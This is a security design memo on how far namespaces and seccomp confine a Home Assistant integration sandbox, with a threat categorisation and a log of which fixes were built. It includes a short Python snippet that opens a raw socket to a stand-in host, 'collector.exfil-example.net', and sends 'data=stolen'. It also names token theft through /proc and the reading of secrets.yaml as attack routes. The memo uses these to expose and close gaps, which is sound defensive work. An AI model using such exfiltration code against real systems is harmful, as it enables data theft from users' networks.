# What namespaces + seccomp actually closes — and what it doesn't

**Date:** 2026-08-14
**Question being answered:** *"We solve almost all the weaknesses we have today with namespaces +
seccomp, right? But we haven't tested it, so other issues could arise."*
**Short answer:** The second half is exactly right. The first half is **directionally correct but
overstated** — and the gap between "almost all" and what is actually true is the difference
between a threat model that survives questioning and one that does not.

---

## The one-paragraph version

Namespaces + seccomp closes **one family** of weaknesses cleanly and completely: everything where
the sandboxed process reaches *around* the shim to touch the host directly — reading the token
out of `/proc`, reading `secrets.yaml`, rewriting its own audit log. That family includes the
single strongest result available to the project (the 2021 HACS file-theft reproduction), so the
work is well worth doing and was, when this was written, the highest-value unstarted item.
**It was built the same day — see `RESULTS_2026-08-14_isolation_spike.md`.**

But it does **not** close three other families. One of them — **network egress, and more sharply
lateral movement to undeclared LAN devices** — looks like it belongs to the first family and does
not; confining it requires building a proxy, which is new architecture rather than a namespace
flag. **Built later the same day** — see `RESULTS_2026-08-14_egress_broker.md`; the prediction
that it needed separate architecture held exactly. Another family is **structural** and no isolation
primitive will ever touch it. And isolation **introduces** a fourth set of risks of its own.

---

## The four categories

### Category A — genuinely closed by namespaces + seccomp ✅

These are the ones where "turn on isolation" really is the fix.

| Weakness | Closed by | Notes |
|---|---|---|
| Token via `/proc/<ppid>/environ` (§5.8 route 2) | **PID namespace** | Sandbox can't see the supervisor's process at all, so there is no `/proc` entry to read |
| Token via `/proc/<ppid>/cmdline` (§5.8 route 3) | **PID namespace** | Same mechanism |
| Token in the child's own environment (§5.8 route 1) | **Not isolation at all** — just remove it from the copied `env` dict | Two lines. Worth doing regardless; it is the only one of the three fixable in `supervisor.py` |
| Reading `secrets.yaml` / `/etc/passwd` (`probe.py` check #5) | **Mount namespace** | This is the one that unblocks the 2021 HACS file-theft reproduction — the strongest single result available |
| Sandbox rewriting its own audit log (§5.8, §6.10 of the findings) | **Mount namespace** | The audit directory simply isn't present in the sandbox's filesystem view |

**This category is real and it matters.** Predicted to convert the probe from "4 of 5 blocked, and
we explain the fifth" into "5 of 5", and to restore the truth of the two claims §5.8 showed were
false. **Measured after building: 4 of 8 → 6 of 8**, the difference being that two further checks
were added for the then-open network gap rather than any Category A prediction failing.
**Now 8 of 8** since Category B was built too. A fourth
token route (`.ha_token` on disk) was also found during verification and was already covered by
the mount namespace.

---

### Category B — looks like Category A, is actually new architecture ⚠️

**Network egress — and, more sharply, lateral movement. This is the one to be careful about.**

> ✅ **CLOSED 2026-08-14** by supervisor-brokered egress — seccomp denies `socket(AF_INET)` and
> the supervisor performs all HTTP, checking each redirect hop. Probe rows 7 and 8 now block, and
> the redirect gap noted at the end of this section closed with it. Everything below is retained
> because the *analysis* is what directed the work, and it proved accurate: this genuinely did
> need new architecture rather than a namespace flag.
>
> **Framing corrected 2026-08-14, after isolation was built.** This section was originally written
> as "network egress", which understates it. Exfiltration is the obvious reading; the sharper one
> is that a raw socket reaches **devices on the user's LAN that the manifest never declared** — a
> lock's local HTTP API, a camera, the router's admin page. None of those require Home Assistant's
> credential, so closing every token route (which isolation did) does nothing about them.
> **Confining lateral movement is the manifest's central promise**, and this is the gap that says
> it is not yet kept. Note this is a step *before* the declared-capability limit in §10.1: that
> one says the manifest cannot stop an integration abusing a device it legitimately declared;
> this one says it cannot yet stop it reaching devices it never declared at all. The second is a
> bigger hole and, unlike the first, it is fixable.

The current state is worse than it appears, and it is worth being precise because the probe
result reads as reassuring. `spike/shim/homeassistant/helpers/aiohttp_client.py` implements
`MediatedClientSession`, which calls `_authorise(url)` before every request. That asks the
supervisor `net_request`, which checks the manifest's `network:` allowlist. Good — but look at
what happens next (line 65):

```python
def get(self, url, **kwargs):
    return self._session.get(self._authorise(url), **kwargs)
```

`_authorise` **asks permission, and then the sandbox makes the connection itself.** The TCP
connection originates inside the sandboxed process. The supervisor is consulted; it is not in the
path.

So the check is **advisory, not enforcing.** It binds an integration that politely uses HA's HTTP
helper. It does nothing to one that doesn't:

```python
import socket
s = socket.create_connection(("collector.exfil-example.net", 80))
s.sendall(b"GET /collect?data=stolen HTTP/1.1\r\n...")
```

**Confirmed by test, 2026-08-14** (local listener only, no external traffic):

```
raw socket egress, no mediation: GET /collect?data=stolen HTTP/1.1
```

No `net_request` was sent. No audit record was created. The manifest was never consulted.

> **`probe.py` check #4 does not measure what it appears to measure.** It exercises the *mediated*
> path — `async_get_clientsession`, then a request to an undeclared host — and correctly reports
> that policy allows or denies it. It has never tested the unmediated path. This is the same
> shape as the §5.8 audit-log finding: the result is sound for the mediated path and silent about
> the other one.

**Why a network namespace is not a drop-in fix.** Putting the sandbox in a network namespace with
no interfaces cuts *all* its traffic — including the legitimate API poll that is the integration's
entire purpose. A polling sensor that cannot reach `chaos2.aa.net.uk` does nothing. So the
sandbox needs *some* egress, and the only way to make the allowlist enforcing rather than
advisory is to **route its traffic through the supervisor** — a local proxy inside the namespace,
or a socket the supervisor brokers, with DNS handled too.

That is a genuine piece of architecture. It is comparable in size to the inbound command path
that was declined for actuators (§10.1, estimated 2–3 weeks). It should be **budgeted separately
from "namespaces + seccomp"**, not folded into it.

**Also in this category, already documented in the code:** the redirect gap. The
`aiohttp_client` docstring notes that only the initial URL is checked, so a declared host that
answers with a redirect to an undeclared one is followed unchecked. Fix is
`allow_redirects=False` plus a per-hop check — small, and independent of isolation.

---

### Category C — isolation does not touch these at all ❌

No namespace, no syscall filter, no configuration closes any of these. They must be *stated* in
the threat model as residual risks, because there is no control to point at.

| Weakness | Why isolation can't help |
|---|---|
| **Declared-capability abuse** — the 3am unlock (§10.1) | The integration uses a capability it legitimately declared and genuinely needs. Isolation confines *reach*, not *intent*. Nothing distinguishes a legitimate unlock from a malicious one at the boundary |
| **The over-declaring manifest nobody reads** (§10.4) | A process/social problem. A manifest declaring lock access is a red flag only if someone reviews it, and nothing currently forces review |
| **Supervisor holds an unscoped token** (§5.8) | HA issues no scoped tokens. Compromise of the supervisor is full house compromise. Upstream limitation, not fixable here |
| **Exfiltration through a *declared* host** | If the manifest allows `api.vendor.com` because the integration needs it, stolen data can be encoded into requests to that host. An allowlist controls *destination*, not *content* |
| **Unkeyed audit chain** (§5.8 finding 2) | A mount namespace removes the sandbox's *access* to the log, which closes the practical attack. But the chain remains forgeable by anything that does get write access. Defence in depth argues for the HMAC as well — the two controls fail independently |

**The last row is the subtle one and worth getting right.** It is tempting to say "mount namespace
fixes the audit log, so the HMAC is unnecessary." That is true only while the mount namespace
holds. Two independent controls that both have to fail is a materially different security posture
from one control that must never fail — and since the HMAC is a few lines, there is no good
argument for relying on the namespace alone.

---

### Category D — risks that isolation *introduces* 🆕

This is the part the original question gestures at — *"we haven't tested it, so other issues could
arise"* — and it is the right instinct. Some of these are predictable now.

**Security risks:**

- **The boundary is a syscall interface, not a machine boundary.** A namespaced process still
  calls into the same kernel. Unprivileged user namespaces have a long history of local
  privilege-escalation CVEs — they *expand* reachable kernel attack surface, which is precisely
  why some distributions restrict them. This is the honest answer to *"what is your escape
  story?"*, and it is the trade-off already recorded in Decision 2 (§6): namespaces + seccomp
  chosen over gVisor for coherence with eBPF and weight on the Pi, accepting a weaker boundary.
  **Say this before an auditor asks.**
- **Resource exhaustion is not covered.** Namespaces isolate *visibility*; they do not limit
  consumption. A malicious integration can still fork-bomb, exhaust RAM, or spin the CPU and take
  down HA on a Pi 5. The control for that is **cgroups**, which is a separate mechanism that must
  be added explicitly. Availability is a security property, and a threat model that omits it is
  incomplete.
- **Seccomp policy is itself an attack surface.** Too permissive and it does nothing; too strict
  and it breaks. Getting it wrong in the permissive direction is silent.

**Practical risks that will consume time:**

- **Seccomp filters break CPython in non-obvious ways.** The interpreter, `ssl`, and `aiohttp`
  issue a wider syscall set than expected, and failures surface as confusing crashes rather than
  clean denials. Building the allowlist empirically (trace, then filter) is the only sane route.
- **A mount namespace needs a working minimal filesystem.** Python needs its stdlib,
  `site-packages`, CA certificates for TLS, and `/dev/urandom`. Constructing that view is fiddly
  and is where most of the implementation time will actually go.
- **DNS inside a network namespace** needs explicit handling — it is a common first blocker.
- **The Pi is not the dev machine.** Unprivileged user namespaces were verified on the dev machine
  (`unshare --user --mount --pid --fork` succeeds, §10.2). Ubuntu Server 24.04 arm64 on the Pi 5
  has not been tested and may differ — some distributions restrict unprivileged user namespaces
  by default via `kernel.unprivileged_userns_clone` or AppArmor. **Verify early**; this is
  exactly the kind of thing that is cheap to check now and expensive to discover in October.
- **Debuggability drops sharply.** Failures inside a namespace are harder to observe, which slows
  every subsequent piece of work.

---

## Scorecard

Counting the concrete weaknesses currently known:

| Category | Count | Status after namespaces + seccomp |
|---|---|---|
| A — closed by isolation | 5 (+1 found later) | ✅ **Fixed and measured** — built 2026-08-14, probe 4/8 → 6/8 |
| B — needs new architecture (egress proxy, redirect check) | 2 | ✅ **Built the same day** — probe now 8 of 8; redirect gap closed with it |
| C — structural, no technical control | 5 | ❌ Permanently residual; must be *stated* |
| D — introduced by isolation | ~7 | 🆕 New work and new caveats; 3 hit in practice |

> **Scored after the build.** Category A closed exactly as predicted (plus a fourth token route
> found while verifying — a file on disk, already covered by the mount namespace). Category B was
> correctly identified as needing separate architecture, and was then built the same day, taking
> the probe to 8 of 8. Three of Category D's practical obstacles showed up as real bugs.
> **Doing this analysis before building was worth the time**, and that is worth a line in the
> methodology chapter — the categories predicted not just what would close, but *what kind of
> work* each would take, which is what made the sequencing right.

So: **isolation closes the largest and most visible family, and it was the right next build.** But
"almost all" would still have been wrong in a report at the time. The sentence that was defensible
then — and which the same day's work then overtook:

> Namespaces and seccomp close the host-access family of weaknesses in full, including the one
> required to reproduce the 2021 HACS file-theft pattern. Enforcing the network allowlist
> requires additionally brokering egress through the supervisor, since the current check is
> advisory. A residual set remains that no isolation primitive addresses — declared-capability
> abuse, manifest over-declaration, the unscoped supervisor credential, and content-level
> exfiltration through a legitimately declared host — and these are documented as accepted
> limitations rather than deferred work.

That paragraph is worth more to an auditor than "we sandboxed it."

---

## Recommended sequence

Written as a plan; kept with outcomes marked, since the sequencing is itself a result.

1. ✅ **DONE — probe checks #6, #7 and #8.** Written while all three still failed, which is what
   made every later before/after a measurement rather than an assertion. Cheap, and measurement is
   this project's strongest suit.
2. ✅ **DONE — the two misleading comments** (`supervisor.py:329`, `:79–85`) corrected, and
   `HA_TOKEN` scrubbed from the child's environment. Closed token route 1.
3. ⬜ **HMAC the audit chain.** Still outstanding. A few lines; closes the rebuild attack
   independently of everything else, and the mount namespace removing the sandbox's *access* to
   the log is not a reason to skip it — two independent controls beat one that must never fail.
4. ⬜ **Verify unprivileged user namespaces on the actual Pi.** Still outstanding, and now the
   single largest unknown: everything is tested on x86_64 under WSL2 and the Pi 5 is aarch64.
5. ✅ **DONE — mount + PID namespaces** (`RESULTS_2026-08-14_isolation_spike.md`). Category A, the
   biggest single win; unblocks the 2021 file-theft reproduction.
6. ✅ **DONE — the egress broker** (`RESULTS_2026-08-14_egress_broker.md`), with the redirect
   check falling out of it as predicted. Took the probe from 6/8 to 8/8.
7. ⬜ **Write Category C into the threat model as residual risks.** No code. Required regardless,
   and now the main thing standing between the project and a complete argument.

**What is left is items 3, 4 and 7** — an HMAC, a hardware check, and writing. Two of the three
are small, and the third is the highest-weight artifact for this advisor. That is a materially
better position than the plan assumed when it was written.
